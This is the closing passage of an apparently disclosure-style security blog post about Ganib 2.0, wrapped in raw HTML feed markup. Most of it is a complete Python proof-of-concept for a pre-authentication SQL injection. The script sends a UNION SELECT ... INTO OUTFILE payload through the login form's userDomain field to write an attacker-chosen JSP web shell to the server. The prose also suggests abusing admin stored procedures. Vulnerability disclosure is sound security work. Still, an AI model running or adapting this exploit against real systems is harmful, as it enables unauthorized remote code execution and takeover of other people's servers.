-</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>
-
-
-<p>There will be some issues if Ganib is running in a directory that MySQL does not have permissions to write to, and considering this is a completely portable install, it could be running from anywhere.  Of course, you can also make use of the dozens of stored procedures Ganib installs by default; such as APPLY_ADMIN_PERMISSIONS, REMOVEUSER, or CREATE_PARENT_ADMIN_ROLE; this would simply turn the query from a UNION SELECT into OR PROCEDURE().</p>
-
-<p>I did a quick grep through the remainder of the code base and found multiple other injection vectors; most, however, were postauth.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># Exploit title: Ganib 2.0 SQLi
-</span><span class='line'># Date: 02/02/2014
-</span><span class='line'># Exploit author: drone (@dronesec)
-</span><span class='line'># More information:
-</span><span class='line'># Vendor homepage: http://www.ganib.com/
-</span><span class='line'># Software link: http://downloads.sourceforge.net/project/ganib/Ganib-2.0/Ganib-2.0_with_jre.zip
-</span><span class='line'># Version: &lt;= 2.3
-</span><span class='line'># Fixed in: 2.4
-</span><span class='line'># Tested on: Ubuntu 12.04 (apparmor disabled) / WinXP SP3
-</span><span class='line'>
-</span><span class='line'>from argparse import ArgumentParser
-</span><span class='line'>import sys
-</span><span class='line'>import string
-</span><span class='line'>import random
-</span><span class='line'>import requests
-</span><span class='line'>
-</span><span class='line'>""" Ganib 2.0 preauth SQLi PoC
-</span><span class='line'>    @dronesec
-</span><span class='line'>"""
-</span><span class='line'>
-</span><span class='line'>def loadJSP(options):
-</span><span class='line'>    data = ''
-</span><span class='line'>
-</span><span class='line'>    try:
-</span><span class='line'>        with open(options.jsp) as f:
-</span><span class='line'>            for line in f.readlines():
-</span><span class='line'>                data += line.replace("\"", "\\\"").replace('\n', '')
-</span><span class='line'>    except Exception, e:
-</span><span class='line'>        print e
-</span><span class='line'>        sys.exit(1)
-</span><span class='line'>
-</span><span class='line'>    return data
-</span><span class='line'>
-</span><span class='line'>def run(options):
-</span><span class='line'>    print '[!] Dropping %s on %s...' % (options.jsp, options.ip)
-</span><span class='line'>
-</span><span class='line'>    url = "http://{0}:8080/LoginProcessing.jsp".format(options.ip)
-</span><span class='line'>    shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
-</span><span class='line'>
-</span><span class='line'>    exploit = '1 UNION SELECT "{0}","1","2","3" INTO OUTFILE "{1}"'
-</span><span class='line'>    exploit = exploit.format(loadJSP(options), options.path + '/%s.jsp' % shell)
-</span><span class='line'>
-</span><span class='line'>    data = { "theAction" : "submit",
-</span><span class='line'>             "J_USERNAME" : "test",
-</span><span class='line'>             "J_PASSWORD" : "test",
-</span><span class='line'>             "language" : "en",
-</span><span class='line'>             "remember_checkbox" : "on",
-</span><span class='line'>             "userDomain" : exploit
-</span><span class='line'>           }
-</span><span class='line'>
-</span><span class='line'>    res = requests.post(url, data=data)
-</span><span class='line'>    if res.status_code is 200:
-</span><span class='line'>        print '[!] Dropped at /{0}.jsp'.format(shell)
-</span><span class='line'>    else:
-</span><span class='line'>        print '[!] Failed to drop JSP (HTTP {0})'.format(res.status_code)
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>def parse():
-</span><span class='line'>    parser = ArgumentParser()
-</span><span class='line'>    parser.add_argument("-i", help='Server ip address', action='store', dest='ip',
-</span><span class='line'>                        required=True)
-</span><span class='line'>    parser.add_argument("-p", help='Writable web path (/var/www/ganib)', dest='path',
-</span><span class='line'>                        action='store', default='/var/www/ganib')
-</span><span class='line'>    parser.add_argument("-j", help="JSP to deploy", dest='jsp', action='store')
-</span><span class='line'>
-</span><span class='line'>    options = parser.parse_args()
-</span><span class='line'>    options.path = options.path if options.path[-1] != '/' else options.path[:-1]
-</span><span class='line'>    return options
-</span><span class='line'>
-</span><span class='line'>if __name__ == "__main__":
-</span><span class='line'>    run(parse())</span></code></pre></td></tr></table></div></figure>
-
 ]]></content>
   </entry>
   
